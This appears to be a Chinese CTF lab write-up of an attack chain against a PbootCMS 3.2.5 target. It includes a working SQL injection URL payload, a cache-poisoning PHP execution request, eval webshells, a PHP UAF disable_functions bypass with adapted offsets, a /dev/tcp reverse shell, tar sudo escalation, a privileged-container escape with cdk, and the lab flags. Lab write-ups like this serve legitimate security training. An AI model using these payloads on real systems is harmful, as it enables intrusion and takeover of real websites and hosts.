> 来源：MazeSec
>
> 靶机ID：823
>
> 靶机难度：Easy
>
> 靶机作者：n0ne
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.152`
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于 2026-11-22

> **引用与致谢**：本文的漏洞点、POC 和利用工具来自以下公开资料，特此致谢：
>
> - PbootCMS 前台 SQL 注入 POC：[先知社区《pbootcms 前台 sql 注入 XSS 再到后台 rce》](https://xz.aliyun.com/news/17812)
> - PbootCMS 后台 `sitecopyright` RCE：[CVE-2026-36239 PoC](https://github.com/TazmiDev/CVE-2026-36239)
> - PbootCMS HTML 缓存投毒 RCE：[先知社区《从前台缓存投毒到代码执行》](https://xz.aliyun.com/news/92259)
> - PHP 8.x Serializable var_hash UAF：[php-unserialize-uaf-rce](https://github.com/Gi1gamesh123/php-unserialize-uaf-rce)、[原始研究 calif.io](https://calif.io/research/php-uaf)
> - AntSword disable_functions 绕过插件：[Medicean/as_bypass_php_disable_functions](https://github.com/Medicean/as_bypass_php_disable_functions)
> - 容器逃逸工具 CDK：[cdk-team/CDK](https://github.com/cdk-team/CDK)
> - tar GTFOBins：[GTFOBins tar](https://gtfobins.github.io/gtfobins/tar/)
> - PbootCMS 官方：[pbootcms.com](https://www.pbootcms.com/)

## Flag

| Flag | 值                                            | 位置                                   |
| ---- | --------------------------------------------- | -------------------------------------- |
| user | `flag{user-ec9454bf994aae97408f044dc9678561}` | Web 容器 `/home/pbootcms/user.txt`     |
| root | `flag{root-3fda40ed19748b3edc361f8c439ccca2}` | 宿主机 `/root/root.txt`（`/dev/sda1`） |

## 攻击链

```text
1  nmap 22/80
2  PbootCMS 3.2.5 识别
3  前台 SQL 注入（?tag=）────────────── ay_user.password
4  MD5 破解 → admin 后台
5  后台 HTML 缓存投毒 → 任意 PHP 代码执行（pbootcms）
6  PHP 8.4.27 Serializable UAF → 绕过 disable_functions
7  sudo tar → dev → sudo NOPASSWD:ALL → 容器 root
8  特权容器 + /dev/sda1 → cdk cap-dac-read-search → 宿主 root.txt
```

---

## 一、信息收集

全端口扫描只开放 22 和 80：

```bash
nmap -sC -sV -p- 192.168.205.152
```

```text
22/tcp open  ssh  OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http nginx
```

访问首页，响应头直接暴露 CMS：

```http
HTTP/1.1 200 OK
Server: nginx
X-Powered-By: PbootCMS
```

后台地址为 `/admin.php`，页面标题给出精确版本：

```html
<title>PbootCMS管理中心-V3.2.5-20230421</title>
```

`robots.txt` 只有一条 `Disallow: /ad*`，没有更多入口。默认口令（admin/admin、123456、admin123、pbootcms 等）均失败；连续失败后后台会提示：

```json
{"code":0,"data":"您登录失败次数太多已被锁定，请132秒后再试！","tourl":"","rowtotal":1}
```

因此后面必须拿到真实口令，不能继续盲爆。

---

## 二、PbootCMS 3.2.5 前台 SQL 注入

### 1. 注入点

`apps/home/controller/TagController.php` 的 `index()` 会把 `tag` 参数传给模板解析器：

```php
if (defined('RVAR')) {
    $_GET['tag'] = RVAR;
}
if (! get('tag')) {
    _404('您访问的页面不存在，请核对后重试！');
}
$content = parent::parser($this->htmldir . $tagstpl);
$content = $this->parser->parserBefore($content);
$content = $this->parser->parserPositionLabel($content, 0, '相关内容', Url::home('tag/' . get('tag')));
$content = $this->parser->parserSpecialPageSortLabel($content, - 2, '相关内容', Url::home('tag/' . get('tag')));
$content = $this->parser->parserAfter($content);
```

`parserListLabel()` 解析 `{pboot:list filter=...}` 时，`filter` 的值在进入 SQL 之前只做了部分转义，`filter[0]` 可以被闭合后 UNION。最终 SQL 类似：

```sql
... AND(1=2)UNION/**/SELECT/**/.../**/--/**/ like '%123%')
```

### 2. POC

目标表是 `ay_user`，密码字段为 `password`，`ay_content` 查询共 29 列。把密码放在第 6 列，由 `[list:link]` 回显（POC 来源：[先知社区 17812](https://xz.aliyun.com/news/17812)）：

```text
/index.php?tag=ccc:{pboot:list filter=1=2)UNION/**/SELECT/**/1,2,3,4,5,(select/**/password/**/from/**/ay_user),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29/**/--/**/|123 scode=123}[list:link link=asd]{/pboot:list}
```

URL 编码后请求，页面“相关内容”链接变成：

```text
/?tag/ccc:8a24367a1f46c141048752f2d5bbd14b/
```

拿到管理员密码 MD5：

```text
8a24367a1f46c141048752f2d5bbd14b
```

### 3. 破解与登录

```bash
echo 8a24367a1f46c141048752f2d5bbd14b > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
8a24367a1f46c141048752f2d5bbd14b:P@ssw0rd!
```

用户名通过同一注入点可确认为 `admin`：

```text
/?tag/ccc:admin/
```

登录后台：

```bash
curl -s -c cj -b cj \
  -X POST 'http://192.168.205.152/admin.php?p=/Index/login' \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=P@ssw0rd!' \
  --data-urlencode "formcheck=$(curl -s -c cj http://192.168.205.152/admin.php | grep -oP 'name="formcheck" id="formcheck" value="\K[^"]+')"
```

```json
{"code":1,"data":"/admin.php?p=/Index/home","tourl":"","rowtotal":1}
```

---

## 三、后台到 PHP 代码执行

### 1. 站点信息写 PHP 不执行

后台「站点信息」`/admin.php?p=/Site/index` 有 `statistical`（统计代码）和 `copyright`（尾部信息）两个字段，提交到 `/admin.php?p=/Site/mod`。[CVE-2026-36239](https://github.com/TazmiDev/CVE-2026-36239) 描述的正是这里：`decode_string()` 会 `stripcslashes()` / `htmlspecialchars_decode()`，把编码后的 PHP 还原。

但直接写入：

```php
<?php echo 'PWN_CP'; system($_GET['c']); ?>
```

清缓存后访问首页，页面只把 `<?php ... ?>` **原样输出**，并没有执行。原因是该版本缓存文件按 HTML 读取，不是按 PHP include；CVE 的 PoC 只能写 `shell.php`，而本目标随后仍受 `disable_functions` 限制。

### 2. HTML 缓存投毒

真正可执行的位置在前台 Spider 回显（参考：[先知社区 92259](https://xz.aliyun.com/news/92259)）：

```php
if ($this->config('spiderlog') !== '0') {
    if ($this->config('tpl_html_cache')) {
        $spidercode = "<script src='" . Url::home('Spider', null, 'url=' . URL) . "' async='async'></script>";
        $content = preg_replace('/(<\/body>)/i', $spidercode . "\n$1", $content);
    }
}
```

`URL` 来自当前请求，直接拼进页面；页面又被写入 `runtime/cache/*.html`，第二次命中缓存时会被 PHP 解释。请求必须使用**原始 URL**，不能用浏览器自动编码 `<?`。

先清缓存：

```bash
curl -s -b cj 'http://192.168.205.152/admin.php?p=/Index/clearCache'
```

发送两次相同请求：

```http
GET /?p=/aboutus/&s=<?=/**/print("PWNX");?> HTTP/1.1
Host: 192.168.205.152
Cookie: lg=cn
```

第一次响应中的 Spider 片段是原始 payload：

```html
<script src='/?Spider/&url=/?p=/aboutus/&s=<?=/**/print("PWNX");?>' async='async'></script>
```

第二次相同请求命中缓存，`s=` 变成执行结果：

```html
<script src='/?Spider/&url=/?p=/aboutus/&s=PWNX1' async='async'></script>
```

把 `print` 换成 `phpinfo()` 同样执行，确认环境：

```text
PHP Version 8.4.27
Server API FPM/FastCGI
DOCUMENT_ROOT /var/www/pbootcms
```

随后写入一句话：

```php
<?php eval($_POST['x']); ?>
```

访问 `/x.php`，POST `x=...` 即可执行任意 PHP。实际最后保留的是：

```php
<?php Eval($_POST['ant']) ?>
```

### 3. 环境限制

`phpinfo()` 和 `ini_get()` 读出：

```text
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,proc_get_status,
                    pcntl_exec,pcntl_fork,pcntl_signal,putenv,dl,mail,mb_send_mail,
                    imap_open,ini_alter,ini_restore,apache_setenv,symlink,link
open_basedir = /var/www/pbootcms:/tmp:/usr/share/php:/var/lib/php/sessions
ffi.enable = preload
```

进程用户：

```text
uid=1000(pbootcms) gid=1000(pbootcms) groups=1000(pbootcms)
```

到这里只是“任意 PHP 代码执行”，不是系统命令执行。

---

## 四、disable_functions 绕过（PHP 8.4.27 UAF）

### 1. 先排除简单路径

| 尝试                                                         | 结果                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `FFI::cdef("int system(...)", "libc.so.6")`                  | `FFI API is restricted by "ffi.enable" configuration directive` |
| `SQLite3::loadExtension('/tmp/evil.so')`                     | `bool(false)`，`sqlite3.defensive` 无法真正开启扩展加载      |
| `/run/php/php8.4-fpm.sock`                                   | 当前 `pbootcms` 用户访问 `/run/php` 为 `EACCES`，socket 不可达 |
| [AntSword](https://github.com/Medicean/as_bypass_php_disable_functions) `ant_x64.so` + `gconv-modules` | `php -n -S 127.0.0.1:61670` 从未启动，`putenv` 被禁，`GCONV_PATH`/`LD_PRELOAD` 都设不进去 |
| `cmd.php` 的 `$a($b)`                                        | `system/exec/popen/proc_open/pcntl_exec` 全部被移除，动态调用同样失败 |

### 2. Serializable var_hash UAF

使用 [`php-unserialize-uaf-rce`](https://github.com/Gi1gamesh123/php-unserialize-uaf-rce)（CVE-2026-109618/619）的 EXP：`Serializable::unserialize()` 派发时缺少 `BG(serialize_lock)++`，gadget 内嵌套 `unserialize()` 复用外层 var_hash，属性表 8→16 扩容释放旧 `arData`，外层 `R:N;` 反向引用悬空。最终伪造 `zend_closure`，从 `standard` 模块的静态 `zend_function_entry` 表里取 `zif_system`，绕过 `disable_functions`。

EXP 原版按 PHP 8.3.6 适配，本目标是 **PHP 8.4.27**，需要改三个结构体偏移：

| 参数                             | PHP 8.3.6 原版 | 本靶机 PHP 8.4.27 |
| -------------------------------- | -------------- | ----------------- |
| `zend_internal_function.handler` | `0x48`         | **`0x58`**        |
| `zend_internal_function.module`  | `0x50`         | **`0x60`**        |
| `zend_function_entry` 大小       | `0x20`         | **`0x30`**        |

改完后本地同版本 `php -d disable_functions=...` 先验证通过，再上传为：

```text
/var/www/pbootcms/uaf84.php
```

执行命令：

```bash
curl --get --data-urlencode 'c=id; uname -a' \
  http://192.168.205.152/uaf84.php
```

关键回显：

```text
[+] standard module @ 0x5579405c5f80 (via var_dump)
[+] module functions @ 0x5579405ba6a0
[+] zif_system (from module) @ 0x557940237d90
[+] Got fake Closure!

──────────────────────────────────────────────────
uid=1000(pbootcms) gid=1000(pbootcms) groups=1000(pbootcms)
Linux ca0b23b27162 7.2.7-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.2-12.2~trixie (2026-09-22) x86_64 GNU/Linux
──────────────────────────────────────────────────
```

至此拿到 `pbootcms` 命令执行。EXP 的 `?c=` 参数可执行任意 shell 命令，也可直接弹反向 shell：

```bash
bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'
```

---

## 五、容器内提权

### 1. pbootcms → dev

```bash
sudo -l
```

```text
User pbootcms may run the following commands on ca0b23b27162:
    (dev) NOPASSWD: /usr/bin/tar
```

典型的 [tar GTFOBins](https://gtfobins.github.io/gtfobins/tar/)。先写 `/tmp/devcmd.sh`：

```sh
#!/bin/sh
id > /tmp/dev.out
cat /home/dev/user.txt >> /tmp/dev.out 2>&1
ls -la /home/dev >> /tmp/dev.out 2>&1
sudo -l >> /tmp/dev.out 2>&1
```

用 tar 的 checkpoint action 以 `dev` 身份执行：

```bash
sudo -n -u dev /usr/bin/tar \
  --checkpoint=1 \
  --checkpoint-action=exec=/tmp/devcmd.sh \
  -cf /dev/null /etc/hostname
```

```text
uid=1001(dev) gid=1001(dev) groups=1001(dev),27(sudo)
```

### 2. dev → root

`dev` 的 sudo 配置直接给了全部权限：

```text
User dev may run the following commands on ca0b23b27162:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

因此容器内 root 只需：

```bash
sudo -n /usr/bin/id
# uid=0(root) gid=0(root) groups=0(root)
```

但 `/root/root.txt` 不存在：

```text
cat: /root/root.txt: No such file or directory
```

`/root` 下只有 `.bashrc`、`.profile`、`.ssh`，并且根目录存在 `.dockerenv`、`mount` 显示 `overlay` —— 当前是 Docker 容器，root flag 在宿主机。

---

## 六、特权容器逃逸（root flag）

### 1. 容器权限

```bash
capsh --print
```

```text
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
Seccomp: 0
```

`CapEff` 包含全部 capability，`Seccomp: 0`，属于特权容器；并且 `/dev` 下能看到：

```text
brw-rw---- 1 root disk 8, 0 /dev/sda
brw-rw---- 1 root disk 8, 1 /dev/sda1
brw-rw---- 1 root disk 8, 2 /dev/sda2
brw-rw---- 1 root disk 8, 5 /dev/sda5
```

`lsblk` 显示 `sda1` 就是宿主机根分区：

```text
NAME   FSTYPE FSVER LABEL UUID FSAVAIL FSUSE% MOUNTPOINTS
sda
|-sda1                        32.2G     8% /etc/hosts
|                                            /etc/hostname
|                                            /etc/resolv.conf
|-sda2
`-sda5                                  [SWAP]
```

### 2. cdk 读取宿主文件

把 [`cdk`](https://github.com/cdk-team/CDK) 上传到容器（本次由本机 `python3 -m http.server 8000` 提供下载）：

```bash
curl -s http://192.168.205.128:8000/cdk -o /tmp/cdk
chmod +x /tmp/cdk
```

`cdk evaluate` 直接给出可利用点：

```text
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host.
    Use 'cdk run cap-dac-read-search' ...
Critical - SYS_ADMIN Capability Found.
```

`/etc/hostname` 是宿主 `sda1` 绑定进容器的文件，可作为 `cap-dac-read-search` 的 ref：

```bash
cdk run cap-dac-read-search /etc/hostname /root/root.txt
```

```text
Running with target: /root/root.txt, ref: /etc/hostname
flag{root-3fda40ed19748b3edc361f8c439ccca2}
```

备用方法 `cdk run mount-disk` 会把 `/dev/sda1` 挂到 `/tmp/cdk_xxxxxx`，同样可读：

```text
success! device /dev/sda1 was mounted to /tmp/cdk_LNFOz
/tmp/cdk_LNFOz/root/root.txt
```

root flag 到手。